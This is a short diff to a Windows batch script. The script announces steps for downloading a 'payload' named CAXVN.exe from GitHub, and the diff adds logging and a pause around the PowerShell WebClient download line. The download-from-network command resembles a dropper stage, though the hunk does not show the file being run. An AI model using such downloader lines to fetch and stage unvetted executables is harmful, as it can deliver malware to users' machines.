@@ -213,7 +213,13 @@ timeout /t 1 /nobreak >nul
 echo [*] STEP 2: Connecting to GitHub...
 timeout /t 1 /nobreak >nul
 echo [*] STEP 3: Downloading payload (CAXVN.exe)...
-"%PWSH%" -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
+:: --- DEBUGGING START ---
+:: Redirect PowerShell's output (including errors) to a temporary log file.
+:: This will allow us to inspect what PowerShell is doing even if the batch file closes.
+"%PWSH%" -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')" > "%temp%\powershell_download_debug.log" 2>&1
+echo DEBUG: PowerShell download command executed. Check "%temp%\powershell_download_debug.log" for details.
+pause
+:: --- DEBUGGING END ---
 
 if exist "%SETUP_EXE%" (
     echo [+] Download successful.
